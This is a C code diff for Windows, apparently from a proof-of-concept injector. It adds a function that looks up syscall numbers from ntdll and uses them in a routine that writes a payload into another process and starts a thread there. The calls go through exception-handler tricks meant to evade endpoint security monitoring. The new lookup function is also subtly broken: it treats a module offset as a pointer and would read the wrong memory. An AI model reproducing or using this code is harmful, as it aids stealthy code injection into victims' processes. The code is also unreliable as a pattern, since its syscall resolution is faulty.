@@ -50,6 +50,25 @@ ULONG HandleException(PEXCEPTION_POINTERS exception_ptr) {
 	
 }
 
+PULONG GetSysCallNumber(const char* FunctionName) {
+	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
+	PVOID FunctionAddress = GetProcAddress(ntdll, FunctionName);
+	
+	// getting the address at which the instruciton that will invokes the syscall
+	BYTE* syscall_instruction = FindSyscallAddr((ULONG_PTR)FunctionAddress);
+
+	PULONG SysCallNumber = 0;
+	PULONG Offset = 0;
+
+	// Determine the offset of the function within ntdll.dll
+	Offset = (PULONG)((ULONG_PTR)syscall_instruction - (ULONG_PTR)GetModuleHandleW(L"ntdll.dll"));
+
+	// The syscall number is stored in the second half of the instruction
+	SysCallNumber = (PULONG)(Offset + 2);
+
+	return SysCallNumber;
+}
+
 void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	ULONG_PTR syscall_addr = 0x00;
 	FARPROC drawtext = GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwDrawText");
@@ -73,16 +92,22 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	// Note: Below syscall might differ system to system 
 	// it's better to grab the syscall numbers dynamically
 	
-	enum syscall_no {
-		SysNtOpenProcess = 0x26,
-		SysNtAllocateVirtualMem = 0x18,
-		SysNtWriteVirtualMem = 0x3A,
-		SysNtProtectVirtualMem = 0x50,
-		SysNtCreateThreadEx = 0xBD
-	};
+	PULONG SysNt1 = GetSysCallNumber("NtOpenProcess");
+	ULONG SysNtOpenProcess = *SysNt1;
 
+	PULONG SysNt2 = GetSysCallNumber("NtAllocateVirtualMemory");
+	ULONG SysNtAllocateVirtualMemory = *SysNt2;
 	
-	// Todo: encode syscall numbers
+	PULONG SysNt3 = GetSysCallNumber("NtWriteVirtualMemory");
+	ULONG SysNtWriteVirtualMemory = *SysNt3;
+
+	PULONG SysNt4 = GetSysCallNumber("NtProtectVirtualMemory");
+	ULONG SysNtProtectVirtualMemory = *SysNt4;
+
+	PULONG SysNt5 = GetSysCallNumber("NtCreateThreadEx");
+	ULONG SysNtCreateThreadEx = *SysNt5;
+
+
 	// init Nt APIs
 	// Instead of actual Nt API address we'll set the API with syscall number
 	// and calling each Nt APIs causes an exception which'll be later handled from the
@@ -91,10 +116,10 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	// exception handler via RIP register 
 
 	_NtOpenProcess pNtOpenProcess = (_NtOpenProcess)SysNtOpenProcess;
-	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMem;
-	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMem;
-	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;
-	_NtCreateThreadEx pNtCreateThreadEx = (_NtProtectVirtualMemory)SysNtCreateThreadEx;
+	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMemory;
+	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMemory;
+	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMemory;
+	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
 
 
 	HANDLE hProcess = { INVALID_HANDLE_VALUE };
